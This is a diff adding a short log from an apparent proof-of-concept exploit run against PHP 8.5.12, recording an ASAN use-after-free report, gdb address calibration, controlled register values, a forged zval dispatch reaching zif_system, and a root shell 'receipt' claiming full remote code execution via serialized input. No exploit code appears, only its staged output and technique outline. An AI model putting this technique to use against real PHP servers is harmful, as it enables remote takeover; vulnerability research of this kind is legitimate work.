@@ -1,0 +1,15 @@
+=== stage 0: fresh vd6 ASAN receipt (bug present on released 8.5.12) ===
+SUMMARY: AddressSanitizer: heap-use-after-free /tmp/php8512_build/php-8.5.12/Zend/zend_variables.h:42 in i_zval_ptr_dtor
+=== stage 1: gdb discovery (crash-frame calibration) ===
+[+] BASE=0x7ffff5482000  ZIF=0x555555923c60
+=== stage 2: M1 reclaim receipt + M2 payload-byte correlation ===
+   old_data == base ? YES
+#2  zif_str_pad (execute_data=<optimized out>, return_value=0x7ffff54147a0) at /tmp/php8512_build/php-8.5.12/ext/standard/string.c:5971
+rdi            0x4141414141414141  4702111234474983745
+rdi            0x1337beefcafe0133  1384785347551822131
+=== stage 3: CALL — forged bucket zval -> fake object -> zif_system ===
+== M3: zif_system REACHED via forged dtor_obj dispatch
+   rdi (fake zend_execute_data / fake zend_object) = 0x7ffff5482018  (expect 0x7ffff5482018)
+=== RECEIPT ===
+uid=0(root) gid=0(root) groups=0(root)
+[PASS] pwn_zero5: full RCE on stock-default PHP 8.5.12 (serialize-only, zero5/vd6)
